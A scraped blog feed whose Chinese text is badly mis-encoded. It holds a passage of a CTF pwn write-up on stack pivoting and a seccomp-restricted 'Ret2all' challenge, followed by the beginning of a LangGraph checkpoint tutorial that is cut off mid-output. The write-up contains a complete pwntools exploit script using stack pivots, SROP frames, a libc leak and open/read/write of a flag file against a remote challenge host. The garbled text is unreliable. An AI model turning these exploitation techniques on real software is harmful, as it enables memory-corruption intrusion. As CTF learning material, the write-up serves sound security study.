æ¥ä¸æ¥æ¯pop rbpç¶åå°±æ¯retï¼å¨bsséåå¼ç»§ç»­æ§è¡äºãä»å¾ä¸­ä¹å¯ä»¥çå°ï¼rspä¸rbpé½è¢«æä»¬æ§å¶äºï¼å½æ°çæ å·²ç»ååäºï¼æä»¥å«æ è¿ç§»ãå·ä½çæ»å»å¯ä»¥ççæä¹åçæç« ã<a href="https://www.cnblogs.com/firefly-star/p/19407067" target="_blank">ret2csuä¸æ è¿ç§»çè¿ç¨</a></p>
<h2 id="æ è¿å">æ è¿å</h2>
<p>çå°è¿ä¸ç¥éåä½ææ²¡ææ³è¿ï¼æ¢ç¶æä»¬èªå·±å®ä¹çå½æ°(è¿éçä¾å­å°±æ¯wow)æè¿åå°åï¼é£cè¯­è¨åºéçreadï¼printfï¼write....ç­å½æ°ææ²¡æè¿åå°åå¢ï¼å¥½åæ²¡å¬è¿ï¼é¦åï¼ä»ä»¬ä¹æ¯æè¿åå°åçï¼å ä¸ºè°ç¨ä»ä»¬ä¹éè¦callè¿ä¸ªæä»¤ï¼è¿ä¸ªæä»¤å°±ä¼æä¸æ¡æä»¤çå°åå¥æ ï¼åªæ¯å ä¸ºè°ç¨ä»ä»¬çæ¶åæ å·²ç»ç±»ä¼¼è¿ä¸ªæ ·å­äº<br>
<img alt="6IZ$2H)A7(3{ENKG)8Z_XXX" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216205958050-981314556.png" class="lazyload"></p>
<p>æä»¥åªæè¿æ¶årspçå°æ¹åäºä¸æ¡è¿åå°åï¼æä»¬å¨æ ä¸çå±é¨åécéåå¼ä¹æ¯è¦çä¸å°è¿ä¸ªå°åçï¼æä»¥ä¸è¬ç¨ä¸å°è¿ä¸ªææ³ãå½ç¶æ¢ç¶æ¯ä¸è¬å°±æä¾å¤ï¼æ¯å¦æ ¼å¼åå­ç¬¦ä¸²å¯ä»¥æ¹printfå½æ°çè¿åå°åï¼readå¦æè½æ§å¶åå¥çå°åä¹å¯ä»¥æ¹å°(ä¹å¾æº¢åºä¸æ¬¡ææå¯è½)</p>
<h2 id="æ å¯¹é½çåå åè§£å³åæ³">æ å¯¹é½çåå åè§£å³åæ³</h2>
<p>æ å¯¹é½å°±æ¯ä¸ºä»ä¹ææ¶åæä»¬è¿åsystemçæ¶åè¦å ä¸ªretï¼å®éä¸å°±æ¯æ æ²¡å¯¹é½éè¿å retå¯¹é½ãæ å¯¹é½å°±æ¯rspæéè¦16å­èå¯¹é½ï¼å ä¸ºç³»ç»è°ç¨çæ¶åè¦æ±è¦å¯¹é½ï¼ä¹å°±æ¯rspæåä¸ä¸ª16è¿å¶ä½è¦æ¯0ãå³äºè¿ä¸ªåå å°±æ¯ä¸ªäººè§ç¹äºï¼æä¸ªäººçè§£çåºè¯¥æ¯è¾æµï¼æè®¤ä¸ºå°±æ¯ç³»ç»æ¬èº«è¯å®ä¼è®©rspå¯¹é½ä»¥åæä»¬èªå·±è°ç¨systemå½æ°çæ¶åå´©æºï¼ä½æä»¬å¾è¿åå°ååé¢å¯è½åå¾å¤æä»¤çå°åï¼æä»¥å°±å¯¼è´äºä¸å¯¹é½ãè§£å³åæ³: å ä¸º64ä½ä¸æ çåå­ååæ¯ä»¥8ä¸ºåä½çï¼ä¹å°±æ¯æä»¬rspçå°åçæåä¸ä¸ª16è¿å¶åªæ8å0ä¸¤ç§å¯è½ï¼å¹¶ä¸æ­£å¸¸æ¯rspçæ«ä½8ï¼è¿æ ·å¨æ¥ä¸æ¥çsystemå½æ°éï¼å ä¸ºä»ä¼push rbp,è¿æ ·rspå°±16å­èå¯¹é½äºï¼æä»¥æä»¬ä¸å¯¹é½å°±è¯´ærspçæ«ä½æ¯0ï¼è¿æ ·systemå½æ°push rbpä¹årspå°±æ¯8å­èå¯¹é½(æ«ä½æ¯8äº)ï¼è¿éæä»¬è¦ä¹éæ©å ä¸æ¡æä»¤çå°å(å ret)è¦ä¹å°±æè¿åå°åå¾ååï¼è·³è¿push rbpè¿ä¸ªæä»¤ãä¸è¿ä¹æä¾å¤ï¼å¦ææä»¬æ è¿ç§»è¿å°äºæ«å°¾ä¸æ¯0ä¹ä¸æ¯8çå°åï¼å åå¤retä¹æ²¡ç¨ï¼è¿æ¶åå°±è¦ä¿®æ¹è¿ç§»çä½ç½®äºã</p>
<h1 id="ret2all">Ret2all</h1>
<p>å¥½äºä½ å·²ç»å­¦ä¼å½æ°è°ç¨æ äºï¼å¿«æ¥åä¸éæ æº¢åºå§ã</p>
<p><img alt="%TEP143FYN0V%}N{MKI" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210625468-950569538.png" class="lazyload"><br>
è¿é¢ä¿æ¤é¤äºcanaryé½å¼äºï¼ç¬¬ä¸ä¸ªinitç»äºæä»¬rbpä¸retï¼è¿ä¸¤ä¸ªå¨bssæ®µä¸ï¼ï¼retå¯ä»¥æ³é²pieåºå°åï¼æä»¥pieä¿æ¤å°±è·æ²¡å¼ä¸æ ·äºï¼åé¢ç¨mprotectæbssæ®µè®¾æåªè¯»äºï¼å¹¶ä¸ææ åéè¯¯ç»å³äºï¼åé¢å¼äºæ²çã<br>
<img alt="$S_FMVUJ5RRF65A8ZMR)A" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210651029-472684802.png" class="lazyload"><br>
æexecveï¼readï¼writeåæ¯é½ç¦äºå¹¶ä¸ä¸é¢writeçæä»¶æè¿°ç¬¦åªè½æ¯2ï¼readçæä»¶æè¿°ç¬¦åªè½æ¯0ãåé¢æä¸ªæ æº¢åºï¼æº¢åº0x28å­è<br>
<img alt="`V{OT$DH{75328S1WROLI" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210719006-1713088119.png" class="lazyload"></p>
<p><img alt="19O3X~YGE8}3XIJ7TQ3IOD" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210738431-1632049454.png" class="lazyload"></p>
<p>è¿ä¸ªæ¯å½±å­ï¼é¦åæ£æµå0x60æ¯ä¸æ¯"I love you I feel lonely"å­ç¬¦ä¸²ï¼åé¢æ£æµrbpä¸retæ¯ä¸æ¯ä¹ååç»æä»¬çï¼ç¸å½äºåªè½æº¢åº0x18äºï¼å¹¶ä¸è¿åªè½æº¢åºå°è¿åå°å+8çä½ç½®ãä¸è¿è¿éå ä¸ºä»è°ç¨äºä¸æ¬¡å½æ°ï¼æä»¥ä¼leaveä¸æ¬¡ï¼å°±ææ è¿ç§»çæºä¼ï¼å¹¶ä¸å¨readå°0x88çå°æ¹æ­£å¥½æ¯rbpæåä¸æ¬¡æåçå°æ¹ï¼ä¹å°±æ¯ä¸¤æ¬¡leaveå°±å°äºæä»¬å¯ä»¥æ§å¶çå°æ¹ï¼æä»¬æåææä»¬è¿åå°å+8çå°åå°±å¯ä»¥å®ç°ä¸æ¬¡readäº<br>
<img alt="ZOM}~FZ59(@L(2Q)2S" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210814457-1728449814.png" class="lazyload"></p>
<p>ä½è¿éè¦æ³¨æï¼readä¹åä¸ä¼ç´æ¥è¿åï¼èæ¯ä¼è¿å½±å­ï¼æä»¥è¿éæä»¬readåå¥çå°æ¹æè®²ç©¶ï¼è¦è½è¦çè¿æä»¬call readçè¿åå°åï¼å®ç°æ è¿åï¼å³å¾rspçä¸æ¹åã<br>
<img alt="4X1(O6@5X$85)}4FHDX(O" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210836478-1888834782.jpg" class="lazyload"><br>
è¿éåªè¦è¦çærspå°±å¯ä»¥éåºå½±å­äºï¼å ä¸ºç®åæ³é²ä¸åºlibcï¼æä»¥åªè½ç¨æ ä¸ç°æçlibcå°åï¼æä»¬å¯ä»¥æ¾ä¸ä¸éè¿çï¼å ä¸ºæä»¬æå¤è¦çä¸å­èï¼å ä¸ºè¿ç¨libcåºåå¤§é¨åæ¯000ç»å°¾çï¼æä»¬è¦çä¸å­èæ¯å¯ä»¥ç¡®ä¿æ¯æ¬¡é½è½å©ç¨ï¼å¦æè¦çä¸¤å­èå°±éè¦çç ´å­è¿æ°äºã<br>
<img alt="CO~10V{RTPYTD0{QIP4$}9" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210907517-1913319700.png" class="lazyload"></p>
<p>è¿éæä¸ä¸ªsyscallï¼ä½è¿ä¸ªsyscallä¸æ¯ç¹å«å¥½ï¼å ä¸ºå¦ææä»¬ç¨è¿ä¸ªsyscallè°ç¨å½æ°åé¢æä¸ä¸ªjmpï¼ä»ä¸æ¯retï¼å°±æ¯è¾é¾é¢æµäºãæä»¥æä»¬ç¬¬ä¸æ¬¡syscallè°ç¨sropæ¥æ§å¶rbxï¼ä¹åéåmagicgadgetæ¹æåºè¯¥å¥½ç¨çgadgetãæ¹å¥½ä¹åå°±å¯ä»¥è°ç¨dup2(1,2)ææ åè¾åºçåå®¹å¤å¶å°æ åéè¯¯ï¼æ¥ä¸æ¥å°±å¯ä»¥writeæ³é²libcï¼ælibcä¹åå°±åclose(0)ï¼è®©openæå¼çæä»¶æè¿°ç¬¦æ¯0ï¼è¿æ ·readå°±å¯ä»¥å¾æ ååflagäºï¼æååwriteæå°åºæ¥flagå°±ç»æäºãèè¿å°±éè¦æä»¬å¨syscallä¸é¢åå¸ç½®å¥½sropçSigreturnFrameç»æï¼è¿éå ä¸ºé¿åº¦æéä¸è½ç¨pwntoolsçå½æ°ãåªè½ææäºãå¹¶ä¸è¦æ³¨æä¸ä¸å¾ä¸åéè¦rspå¨ä¸é¢ï¼å ä¸ºæä»¬readè¿æå½±å­è·çï¼æä»¥rspå¨ä¸é¢æè½å®ç°æ è¿åï¼æä»¥ç¬¬ä¸æ¬¡å¾ä¸åæ¯éä¸äºå½±å­çï¼ç®åæ¥è¯´å°±æ¯åå¾ä¸ï¼ç¶åleaveä¸æ¥ï¼åleaveä¸å»å°±å¥½äº(è¿éä¸ä¸æ¯ç¸å¯¹syscallæ¥è¯´çï¼è¿æ¯è¿é¢æå³é®çé¨åï¼ãå¤§æ¦æææ¯è¿æ ·<br>
<img alt="SMCYK`YCX%F8JAEDR$QTXAC" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216210937234-2026754148.jpg" class="lazyload"></p>
<p>å ä¸ºä¸å¼å§çrbpæ¯å®æ­»çï¼æä»¥æä»¬è¦æ³¨æå¨ç¬¬ä¸æ¬¡çrbpä¸æ¾å¥½ä¸é¢çå°åå°±å¯ä»¥äºï¼åªè¦è½è°åºä¸æ¬¡sropå°±å¥½åå¾å¤äºï¼sropç»æå¦ä¸<br>
<img alt="QCEGSM~4(_)Y0I3UKO)E38Y" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216211036098-1650172372.png" class="lazyload"><br>
è¿éå°±æ¯ä»å·¦å¾å³è¯»ï¼ç¬¬ä¸ä¸ªæ¯syscallï¼ç¬¬äºä¸ªæ¯uc_flagsç¬¬ä¸ä¸ªæ¯&amp;ucä¹åä¾æ¬¡è¯»ä¸å»ï¼å¤§æ¦ç¦»syscall0x70çä½ç½®æ¯rdiï¼ä¹åè°ç¨å®ä¸æ¬¡sropè¦å¾syscallä¸é¢ä¸ä¸ªä½ç½®åä¸ä¸ªleaveï¼å¹¶ä¸è¿ä¸ªleaveæ«å°¾è¦å°äº4ï¼å ä¸ºè¿æ ·syscall retä¹åå°±æ¯leaveï¼æä»¬åªè¦æ§å¶rbpå°±å¯ä»¥ç»§ç»­æ§å¶ç¨åºæµãä¹åå¤å¸å±ä¸ä¸å°±å·®ä¸å¤åå®äºè¿é¢ï¼å¤è°è¯å°±å¥½ãè¿éå ä¸ºæçæ¬å°ç¯å¢è·è¿ç¨ä¸ä¸æ ·ï¼æä»¥åºè¯¥æ¯æä¸äºè¿ç¨çï¼ä¸è¿å¯ä»¥åèä¸ä¸ï¼åºè¯¥å¸å±ä¸æ¯å¤§å·®ä¸å·®äºï¼ä¼°è®¡æ¯æäºç»èä¸ä¸æ ·ãexpå¦ä¸</p>
<pre><code>from pwn import *
import sys
context.log_level='debug'
context.arch='amd64'
flag = 0
elf=ELF('./pwn')
libc = ELF('./libc.so.6')
if flag:
    p = remote('challenge.imxbt.cn',30705)
else:
    p = process('./pwn')
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def csu():
	pay=p64(0)+p64(0)+p64(1)
	return pay
def dbg():
    gdb.attach(p)
    pause()
ru(b'RBP:')
rbp=int(p.recvline(),16)
print(hex(rbp))
ru(b'RET:')
ret=int(p.recvline(),16)
pie=ret-0x1871
re=pie+0x3FB8
prbp=pie+0x1253
main=pie+0x1874
magic=pie+0x1252
target=pie+0x4050
leave=pie+0x1852
ret1=pie+0x18AC
read=pie+0x182F
read1=pie+0x1840
print(hex(pie))
pay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x18,read)+p64(rbp-0x10)
dbg()
sd(pay)
pause()
pay=flat({
0x30:p64(rbp+0xc0+0x30),#rbo:0x48
0x38:p64(read),
0x40:p64(leave),
0x48:p64(rbp+0xe0-0x10+0x30),
0x50:p64(leave),
0x58:p64(rbp+0xd0+0x30),
0x60:p64(rbp-0x18),
0x68:p64(leave),
},filler=p64(ret1))#flat(prbp,rbp+0x72+8,read)
sd(pay+b'\xec')
pause()
pay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x90+0x60,read)+p64(leave)
sd(pay)
pay=flat({
0x0:p64(0),#fake
0x8:p64(0),#rdi
0x10:p64(rbp+0x30),#rsi
0x18:p64(rbp+0x28+0x3d),#rbp
0x20:p64(0x6ede9),#rbx
0x28:p64(0x200),#rdx
0x30:p64(0),#rax
0x38:p64(0),#rcx
0x40:p64(rbp+0x40),#rsp
0x48:p64(read1),
0x50:p64(0),#eflag
0x58:p64(0x33),#cs
0x60:p64(rbp+0x90+1+0x60+0x60),
0x68:p64(read),
0x70:p64(rbp+0x20),
0x78:p64(leave),
0x80:0,
})
pause()
sd(pay)
pay=b'b'*7+p64(prbp)
pause()
sd(pay)
pay=p64(leave)+flat(ret1)*2+p64(magic)+flat(prbp,rbp+0x59+0x60,read,rbp+0x20,leave,rbp+0x70+0x60,read,read)
pay=pay.ljust(0x60,b'\x00')+flat({
0x0:p64(0),#fake
0x8:p64(1),#rdi
0x10:p64(2),#rsi
0x18:p64(rbp+0x100),#rbp
0x20:p64(0x6ede9),#rbx
0x28:p64(0x200),#rdx
0x30:p64(33),#rax
0x38:p64(0),#rcx
0x40:p64(rbp+0x28),#rsp
0x48:p64(ret1),
0x50:p64(0),#eflag
0x58:p64(0x33),#cs
0x60:p64(0),
0x68:p64(0),
0x70:p64(rbp+0x60+0x90),
0x78:p64(read),
0x80:0,
})
sd(pay)

pay=b'b'*7+p64(prbp)
sd(pay)

pay=flat({
0x0:p64(0),#fake
0x8:p64(2),#rdi
0x10:p64(re),#rsi
0x18:p64(rbp+0x100-0x88),#rbp
0x20:p64(0),#rbx
0x28:p64(0x20),#rdx
0x30:p64(1),#rax
0x38:p64(0),#rcx
0x40:p64(rbp+0x28),#rsp
0x48:p64(ret1),#rip
0x50:p64(0),#eflag
0x58:p64(0x33),#cs
0x60:p64(rbp+0x90+1+0x60+0x60),
0x68:p64(read),
0x70:p64(rbp+0x20),
0x78:p64(leave),
0x80:0,
})

sd(pay)
pay=b'b'*7+p64(prbp)

sd(pay)
ru(b"Keep it and...I love you\n")

libcbase=u64(rc(6).ljust(8,b'\x00'))-libc.sym['read']
re=libcbase+libc.sym['read']
rax=libcbase+0xdd237
rdi=libcbase+0x10f75b
rsi=libcbase+0x110a4d
end=libcbase+0x98fd5
rbx=libcbase+0x586e4
mdx3=libcbase+0xb0133
print(hex(libcbase))
pay=b'./flag\x00\x00'*2+flat(rdi,0,rsi,rbp+0xd8,rbx,0x1000,mdx3,0,0,0,re)

pause()
sd(pay)

srop=SigreturnFrame()
srop.rax=3
srop.rdi=0
srop.rsi=0
srop.rsp=rbp+0x1e8
srop.rip=end
srop1=SigreturnFrame()
srop1.rax=2
srop1.rdi=rbp+0x70
srop1.rsi=0
srop1.rsp=rbp+0x1e8+0x110
srop1.rip=end
srop2=SigreturnFrame()
srop2.rax=0
srop2.rdi=0
srop2.rsi=rbp
srop2.rdx=0x50
srop2.rsp=rbp+0x1e8+0x110+0x110
srop2.rip=end
srop3=SigreturnFrame()
srop3.rax=1
srop3.rdi=2
srop3.rsi=rbp
srop3.rdx=0x50
srop3.rip=end
pay=flat(rax,0xf,end)+bytes(srop)+flat(rax,0xf,end)+bytes(srop1)+flat(rax,0xf,end)+bytes(srop2)+flat(rax,0xf,end)+bytes(srop3)

sd(pay)
ti()
</code></pre>
<p>è¿éæç¨äº11æ¬¡sendï¼è·æ ç­ä¸ä¸æ ·çå°±æ¯ä»æ¯æ³é²libcé¡ºä¾¿æ§å¶äºrdxï¼ä¹åç´æ¥ç¨sropé¾äºï¼ææ¯æ²¡é¡ºä¾¿æ§å¶rdxï¼ååäºä¸ä¸gadgetï¼æä»¥å¤äºä¸æ¬¡sendãææå¦ä¸<br>
<img alt="RRAVM4}FI(AN(G1CJAC_NB9" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3728044/202602/3728044-20260216211106610-104254198.png" class="lazyload"></p>
<p>ret2allåèæç« <a href="https://blog.csdn.net/j284886202/article/details/151363747" target="_blank" rel="noopener nofollow">ret2all</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.03611111111111111" data-date-updated="2026-02-16 22:11">2026-02-16 21:19</span>&nbsp;
<a href="https://www.cnblogs.com/firefly-star">firefly_star</a>&nbsp;
éè¯»(<span id="post_view_count">98</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19620531);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19620531', targetLink: 'https://www.cnblogs.com/firefly-star/p/19620531', title: 'å½æ°è°ç¨æ ä¸Ret2all' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ [æè§£LangChainæ§è¡å¼æ]æä¹åç¶æçæå ]]></title>
    <link>https://www.cnblogs.com/jaydenai/p/19623976/read-state</link>
    <guid>6b8626fc8800928767c63ff7e2d3671c</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/jaydenai/p/19623976/read-state" title="åå¸äº 2026-02-19 07:58">
    <span role="heading" aria-level="2">[æè§£LangChainæ§è¡å¼æ]æä¹åç¶æçæå</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        åé¢ä»¥`åå¥`çè§åº¦ä»ç»äºBaseCheckpointSaverç`put/aput`å`put_writes/aput_writes`æ¹æ³,å®ä»¬åå«å®ç°äºåºäºCheckpointåPending Writeçæä¹åãå¯¹äºä¸ä¸ªå·²ç»å®æçSuperstepæ¥è¯´ï¼å¯¹åº Checkpointå°±ä»£è¡¨äºå®çç¶æï¼ä½æ¯å¯¹äºä¸ä¸ªå ä¸­æ­å°æªå®æçSuperstepï¼æä¸ªæ¶å»çç¶æç±ä¸ä¸SuperstepçCheckpointåå½åSuperstepçææPending Writeæ¥æè¿°ãå¦æççéè¦æ¢å¤å°ä¸­æ­æ¶çç¶æï¼éè¦å¨Checkpointåºåç¶æåºç¡ä¸æåºéæ¾ææçPending Writeï¼å®éä¸åªéè¦éæ¾ä»£è¡¨æåæ§è¡ä»»å¡çPending Writeï¼å°±å¯ä»¥äºã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>åé¢ä»¥<code>åå¥</code>çè§åº¦ä»ç»äºBaseCheckpointSaverç<code>put/aput</code>å<code>put_writes/aput_writes</code>æ¹æ³,å®ä»¬åå«å®ç°äºåºäºCheckpointåPending Writeçæä¹åãå¯¹äºä¸ä¸ªå·²ç»å®æçSuperstepæ¥è¯´ï¼å¯¹åº Checkpointå°±ä»£è¡¨äºå®çç¶æï¼ä½æ¯å¯¹äºä¸ä¸ªå ä¸­æ­å°æªå®æçSuperstepï¼æä¸ªæ¶å»çç¶æç±ä¸ä¸SuperstepçCheckpointåå½åSuperstepçææPending Writeæ¥æè¿°ãå¦æççéè¦æ¢å¤å°ä¸­æ­æ¶çç¶æï¼éè¦å¨Checkpointåºåç¶æåºç¡ä¸æåºéæ¾ææçPending Writeï¼å®éä¸åªéè¦éæ¾ä»£è¡¨æåæ§è¡ä»»å¡çPending Writeï¼å°±å¯ä»¥äºã</p>
<h2 id="1-è¯»åcheckpointåpinding-write">1. è¯»åCheckpointåPinding Write</h2>
<p>å¦ä¸è¿ä¸ª<code>CheckpointTuple</code>ç¨æ¥è¡¨ç¤ºCheckpointåPending Writeçç»åä½ãé¤äºè¿ä¸¤ä¸ªæ ¸å¿æåï¼å®è¿åæ¬å½åçæ§è¡éç½®ï¼configåparent_configï¼ååæ°æ®ãå·ä½çPending Writeç±Task IDãChannelåç§°ååå¥æ°ç»ç»æçä¸åç»PendingWriteè¡¨ç¤ºã</p>
<pre><code class="language-python">class CheckpointTuple(NamedTuple):
    config: RunnableConfig
    checkpoint: Checkpoint
    metadata: CheckpointMetadata
    parent_config: RunnableConfig | None = None
    pending_writes: list[PendingWrite] | None = None
PendingWrite = tuple[str, str, Any]
</code></pre>
<p>BaseCheckpointSaveræä¾äºç¨äºè¯»åCheckpointTupleç<code>get_tuple/aget_tuple</code>æ¹æ³ãä½ä¸ºåæ°çRunnableConfigå¯¹è±¡éè¦æä¾Thread IDï¼å¿éï¼åCheckpoint å½åç©ºé´ï¼å¯éï¼ãå¦ææ²¡ææä¾Checkpoint IDï¼æ¹æ³ä¼è¿åæç»çç¶æï¼å¦æå°æªå®æï¼å¾å°çCheckpointTupleåç»å¯è½åå«Pending Writeãå¦ææä¾äºCheckpoint ID, åªæå¨æ­¤IDå¯¹åºææ°çCheckpointä¸åä¸Superstepå°æªå®æï¼è¿åçCheckpointTupleåç»ææå¯è½åå«Pending Writeãå¯¹äºå®ç°å¨BaseCheckpointSaverä¸­çå¦ä¸ç»æ¹æ³<code>get/aget</code>ï¼ä¼å¨åé¨è°ç¨<code>get_tuple/aget_tuple</code>æ¹æ³ï¼å¹¶è¿åCheckpointTupleåç»å°è£çCheckpointå¯¹è±¡ã</p>
<pre><code class="language-python">class BaseCheckpointSaver(Generic[V]):    
    def get(self, config: RunnableConfig) -&gt; Checkpoint | None
    async def aget(self, config: RunnableConfig) -&gt; Checkpoint | None

    def get_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None
    async def aget_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None

    def list(
        self,
        config: RunnableConfig | None,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; Iterator[CheckpointTuple]:
    async def alist(
        self,
        config: RunnableConfig | None,
        *,
        filter: dict[str, Any] | None = None,
        before: RunnableConfig | None = None,
        limit: int | None = None,
    ) -&gt; AsyncIterator[CheckpointTuple]
</code></pre>
<p>å¯¹äºInMemorySaveræ¥è¯´ï¼å®çget_tuple/aget_tupleæ¹æ³ä¼ä»RunnableConfigéç½®ä¸­æåThread IDåCheckpointå½åç©ºé´ï¼å¦ææå®äºCheckpoint IDï¼å®ä»¬ä¼å©ç¨è¿ä¸ä¸ªå¼ä»storageåblobså­å¸ä¸­æåç¸åºæ°æ®ç»æè¿åçCheckpointTupleå¯¹è±¡ãå¦ææ²¡ææå®Checkpoint IDï¼å°±éæ©æè¿çé£ä¸ä¸ªCheckpointçIDã</p>
<p>BaseCheckpointSaverçalistæ¹æ³ä¼ååºå¹¶æ£ç´¢ä¸æå®æ¡ä»¶å¹éçææCheckpointTupleï¼è¿äºåç»ææäºä¸æ®µ âåå²â ãè¯¥æ¹æ³ä¸»è¦ç¨äºä¼è¯ç®¡çãå®¡è®¡åå²è½¨è¿¹ä»¥åç¶æåæº¯ï¼å®å·æå¦ä¸çåæ°ï¼</p>
<ul>
<li>configï¼å¦æRunnableConfigå¦ææä¾äºThread IDï¼è¯¥æ¹æ³å°ä»è¿åè¯¥ç¹å®çº¿ç¨ä¸çCheckpointãå¦æä¸æä¾ï¼å¨æäºå®ç°ä¸­ä¼ååºææçº¿ç¨çææ°Checkpointï¼åå³äºå·ä½çå®ç°é»è¾ï¼ã</li>
<li>filterï¼æä¾åºäºåæ°æ®çè¿æ»¤åè½ï¼ä¾å¦ {"status": "completedâ} ï¼è¿å¨éè¦ç­éç¹å®ä¸å¡ç¶æçCheckpointæ¶éå¸¸æç¨ã</li>
<li>beforeï¼ä»¥RunnableConfigå¯¹è±¡çå½¢å¼æä¾Checkpoint IDï¼è¿åå¨æ­¤ ä¹ååå»ºçè®°å½ãè¿å¯¹äºå®ç° âæ¶é´æè¡â åè½è³å³éè¦ï¼åè®¸ä½ æ¥çå¾æ§è¡åå²ä¸­çæ§çæ¬ã</li>
<li>limitï¼ç¨äºéå¶è¿åæ°æ®çæ°éã</li>
</ul>
<p>æä»¬éè¿å¦ä¸çå®ä¾æ¼ç¤ºæ¥è¿ä¸æ­¥äºè§£æä¹åãæä»¬æå»ºäºä¸ä¸ªç±fooãbar1åbar2è¿ä¸ä¸ªNodeç»æçPregelï¼å¯å¨çæ¶åå©ç¨è¾å¥éå¯¹ééfooçåå¥é©±å¨æ§è¡èç¹fooï¼åèå®æååå¥éébaré©±å¨èç¹bar1åbar2å¹¶è¡æ§è¡ãä¸ä¸ªNodeçå¤çå½æ°é½æ¯handleï¼å®ä¼å°ä¼ å¥çNodeåç§°åå¥ä¸ä¸ªBinaryOperatorAggregateç±»åChannelï¼nodesï¼ï¼ç±æ­¤ç¡®å®æåæ§è¡çNodeãå¦æè°ç¨handleå½æ°å°interruptåæ°æå®ä¸ºTrueï¼å®ä¼éè¿æåºä¸ä¸ªGraphInterruptå¼å¸¸æ¨¡æä¸ä¸ªä¸­æ­ãå¨æä»¬çæ¼ç¤ºå®ä¾ä¸­ï¼èç¹fooåbar2ä¼æ§è¡æåï¼ä¸­æ­ä¼åçå¨èç¹bar1ä¸ã</p>
<pre><code class="language-python">from langgraph.pregel import Pregel, NodeBuilder
from langgraph.channels import LastValue, BinaryOperatorAggregate
from langgraph.checkpoint.memory import InMemorySaver
from langgraph.errors import GraphInterrupt
import operator, json

def handle(node_name: str, interrupt: bool = False) -&gt; list[str]:
    if interrupt:
        raise GraphInterrupt("manual interrupt")
    return [node_name]

foo = (
    NodeBuilder()
    .subscribe_to("foo")
    .do(lambda _: handle("foo"))
    .write_to(nodes=lambda x: x, bar=lambda _: "triggered by foo")
)

bar1 = (
    NodeBuilder()
    .subscribe_to("bar")
    .do(lambda _: handle("bar1", interrupt=True))
    .write_to("nodes")
)

bar2 = (
    NodeBuilder()
    .subscribe_to("bar")
    .do(lambda _: handle("bar2", interrupt=False))
    .write_to("nodes")
)

app = Pregel(
    nodes={"foo": foo, "bar1": bar1, "bar2": bar2},
    channels={
        "foo": LastValue(str),
        "bar": LastValue(str),
        "nodes": BinaryOperatorAggregate(list, operator.add),
    },
    checkpointer=InMemorySaver(),
    input_channels=["foo"],
    output_channels=["nodes"],
)
config = {"configurable": {"thread_id": "123"}}
result = app.invoke({"foo": "triggered by user"}, config=config)
assert result["nodes"] == ["foo", "bar2"]

(config, checkpoint, metadata, parent_config, pending_writes) = (
    app.checkpointer.get_tuple(config)
)
print(f"config:\n{json.dumps(config, indent=4)}")
print(f"checkpoint:\n{json.dumps(checkpoint, indent=4)}")
print(f"metadata:\n{json.dumps(metadata, indent=4)}")
print(f"parent_config:\n{json.dumps(parent_config, indent=4)}")
print(f"pending_writes:\n{json.dumps(pending_writes, indent=4)}")
</code></pre>
<p>æä»¬ä¸ºåå»ºçPregelå¯¹è±¡æä¾äºä¸ä¸ªInMemorySaverä½ä¸ºå®çCheckpointerï¼å¹¶å¨è°ç¨æ¶å©ç¨æä¾çRunnableConfigè®¾ç½®äºThread IDãç±äºæä»¬å°éénodesä½ä¸ºè¾åºï¼æä»¥è°ç¨ç»æä¼åæ ä¸ä¸ªNodeçæ§è¡ç¶æï¼åªæèç¹fooåbar2æåæ§è¡ï¼ãæä»¬éåä¼ å¥ç¸åçéç½®è°ç¨Checkpointerçget_tupleæ¹æ³ï¼å¹¶å°å¾å°çCheckpointTupleåç»è¿è¡æåè¾åºã</p>
<pre><code class="language-json">config:
{
    "configurable": {
        "thread_id": "123",
        "checkpoint_ns": "",
        "checkpoint_id": "1f0f5200-24f1-6382-8000-bde4e02ab92b"
    }
}
checkpoint:
{
    "v": 4,
    "ts": "2026-01-19T10:17:07.498064+00:00",
    "id": "1f0f5200-24f1-6382-8000-bde4e02ab92b",
    "channel_versions": {
        "foo": "00000000000000000000000000000001.0.06769883673554666",
        "nodes": "00000000000000000000000000000002.0.3174924500871408",
        "bar": "00000000000000000000000000000002.0.3174924500871408"
    },
    "versions_seen": {
        "__input__": {},
        "foo": {
            "foo": "00000000000000000000000000000001.0.06769883673554666"
        }
    },
    "updated_channels": [
        "bar",
        "nodes"
    ],
    "channel_values": {
        "foo": "triggered by user",
        "nodes": [
            "foo"
        ],
